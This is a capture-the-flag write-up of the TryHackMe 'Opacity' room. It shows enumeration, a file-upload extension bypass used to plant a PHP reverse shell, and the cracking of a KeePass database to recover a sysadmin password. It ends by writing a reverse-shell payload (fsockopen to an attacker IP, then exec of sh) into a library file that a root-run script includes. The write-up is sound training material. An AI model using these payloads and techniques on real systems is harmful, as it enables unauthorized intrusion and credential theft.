---
title: Writeup for the room Opacity from TryHackMe 
layout: post
post-image: "https://github.com/0xRar/0xrar.github.io/assets/33517160/7bcdacf5-709f-4da9-a951-d37734f5a0fa"
description: 
tags:
- Writeups
- TryHackMe
- Boot2Root
- Web
- Network
---

<!-- # Writeup for the room `Opacity` from TryHackMe -->


## Machine Information
- Name: Opacity
- Difficulty: Easy
- URL: [https://tryhackme.com/room/opacity](https://tryhackme.com/room/opacity)

---

## Initial Enumeration
as always starting with an nmap scan to map the network services running on the machine:
```shell
┌──(kali㉿rar)-[~/THM/Opacity]
└─$ nmap -p- -sV -T4 --min-rate=10000 opacity.thm | tee nmap.log
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-16 18:15 EDT
Warning: opacity.thm giving up on port because retransmission cap hit (6).
Nmap scan report for opacity.thm (opacity.thm)
Host is up (0.14s latency).
Not shown: 62210 closed tcp ports (conn-refused), 3321 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.03 seconds
```

### HTTP (80) 

at first glance going to the website gives us a login form, tried couple of
authentication bypass, sqli techniques but the login ended up being secure?

![login-page](https://github.com/0xRar/0xrar.github.io/assets/33517160/04ee5187-1bb8-4e42-a17a-463dd6a38fb8)

Directory Enumeration:
```shell
┌──(kali㉿rar)-[~/THM/Opacity]
└─$ gobuster dir -u http://opacity.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt| tee dirs.log
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://opacity.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/05/13 19:01:26 Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 308] [--> http://opacity.thm/css/]
/cloud                (Status: 301) [Size: 310] [--> http://opacity.thm/cloud/]
```
<br>
the `/cloud` directory seems to be a `Personal Cloud Storage` that stores "images" for 5 minutes <br>
so we can fool it and establish initial foothold by uploading a reverse shell <br>
the upload feature needs an external url to download from, so we need to host <br>
our http server.

### Samba (139/445) 

SMB Enumeration:
```shell
┌──(kali㉿rar)-[~/THM/Opacity]
└─$ enum4linux opacity.thm

[...]

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\sysadmin (Local User)
```

local user: `sysadmin`

---

## Initial Foothold
to establish foothold we have to upload our reverse shell script to the server via the `/cloud` service <br>
at first i thought it would have some filters but there were none it only need the exstention to exist in <br>
the input field.

Hosting our reverse shell:
[pentestmonkey reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
```shell
┌──(kali㉿rar)-[~/THM/Opacity]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Listening for connections:
```shell
┌──(kali㉿rar)-[~/THM/Opacity]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

after trying to upload my shell as `[shell.php.png, shell.php]` <br>
adding a ``[space] .png`` after the php file extention seems to work ! <br> 

![cloud-fileupload](https://github.com/0xRar/0xrar.github.io/assets/33517160/58c3a6a7-577e-4d2d-be28-e96b63f14a02)

now that we were able to upload our reverse shell, we get redirected to `/cloud/storage.php`, <br>
and our shell script is stored at `http://opacity.thm/cloud/images/shell.php .png` removing the .png <br>
will trigger our shell script and give us shell access to the machine!

![image-link](https://github.com/0xRar/0xrar.github.io/assets/33517160/c85c646d-21df-4d0b-8a52-9749ba16b4a9)

Getting Stable Shell:
```shell
www-data@opacity:/$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@opacity:/$ export TERM=xterm
```

but we are still `www-data` we don't even have a user. 

---

## Privilege Escalation
before uploading any script that help with priv esc like linPEAS i usually check for interesting script & files <br>
in directories like `/tmp`, `/opt` and ofcourse the local user's directory: `/home/sysadmin` <br>

in the /opt directory there is a `KeePassXC` Database, KeePassXC is an offline open-source password manager, <br> 
nice find because we can try and crack the master password!

```shell
www-data@opacity:/$ ls /opt
dataset.kdbx
```

### www-data to sysadmin
Hosting an http server in our target's machine:
```shell
www-data@opacity:/opt$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Downloading the KeePassXC database file to our machine:
```shell
┌──(kali㉿rar)-[~/THM/Opacity]
└─$ wget http://opacity.thm:8000/dataset.kdbx
```

Getting the keepass hash using the `keepass2john` script:
```shell
┌──(kali㉿rar)-[~/THM/Opacity]
└─$ keepass2john dataset.kdbx > keepass_hash
```

Cracking the hash using `John The Ripper`:
```shell
┌──(kali㉿rar)-[~/THM/Opacity]
└─$ john keepass_hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 100000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963        (dataset)     
1g 0:00:00:11 DONE (2023-05-16 19:36) 0.08826g/s 77.31p/s 77.31c/s 77.31C/s chichi..melvin
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```


Opening the database file in `KeePassXC` using the password `741852963`:
```shell
┌──(kali㉿rar)-[~/THM/Opacity]
└─$ keepassxc dataset.kdbx 
```

![keepass-login](https://github.com/0xRar/0xrar.github.io/assets/33517160/7f1658a5-01b0-477b-ba37-79048ad0be3c)
![keepass-sysadmin-password](https://github.com/0xRar/0xrar.github.io/assets/33517160/1fc8bd50-7364-4812-8747-8db3d2f0099b)

Creds: `sysadmin : Cl0udP4ss40p4city#8700`

Login as sysadmin:
```shell
www-data@opacity:/$ su sysadmin
Password: Cl0udP4ss40p4city#8700

sysadmin@opacity:/
```
<br>
```shell
sysadmin@opacity:~$ cat local.txt
REDACTED
```

now that we are logged in as sysadmin we can look for a way to get root on the machine, <br>
but before we do that logging in via ssh is a good idea.


### sysadmin to root
in the `/home/sysadmin/` we can see a directory called `scripts` and inside the directory <br> 
we can see there is a php script that uses a bunch of libraries inside `lib/`. 

script.php:
```php
<?php

//Backup of scripts sysadmin folder
require_once('lib/backup.inc.php');
zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');
echo 'Successful', PHP_EOL;

//Files scheduled removal
$dir = "/var/www/html/cloud/images";
if(file_exists($dir)){
    $di = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS);
    $ri = new RecursiveIteratorIterator($di, RecursiveIteratorIterator::CHILD_FIRST);
    foreach ( $ri as $file ) {
        $file->isDir() ?  rmdir($file) : unlink($file);
    }
}
?>
```

and the funny thing is we own the `lib` directory so we can move/copy files
```shell
sysadmin@opacity:~/scripts$ ls -ld lib/
drwxr-xr-x 2 sysadmin root 4096 Jul 26  2022 lib/
```

because of the script using `lib/backup.inc.php` we can move the file to `home/sysadmin` <br>
and create a file with the same name and sneak in a reverse shell script so everytime the script <br>
runs it triggers our reverse shell.

```shell
sysadmin@opacity:~/scripts/lib$ mv backup.inc.php ../..
```
<br>
now we create the file so we are the owners and we can write into it
```shell
sysadmin@opacity:~/scripts/lib$ touch backup.inc.php
sysadmin@opacity:~/scripts/lib$ ls -ld backup.inc.php 
-rw-rw-r-- 1 sysadmin sysadmin 0 May 17 07:54 backup.inc.php
```
<br>
```shell
sysadmin@opacity:~/scripts/lib$ cat backup.inc.php 
<?php

$sock=fsockopen("10.8.28.52",9000);
exec("sh <&3 >&3 2>&3");

?>
```
<br>
now wait for the script to run, and we have root !
```shell
┌──(kali㉿rar)-[~/THM/Opacity]
└─$ nc -lvnp 9000
listening on [any] 9000 ...
connect to [10.8.28.52] from (UNKNOWN) [opacity.thm] 50722
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
```

Thank You For Reading ❤
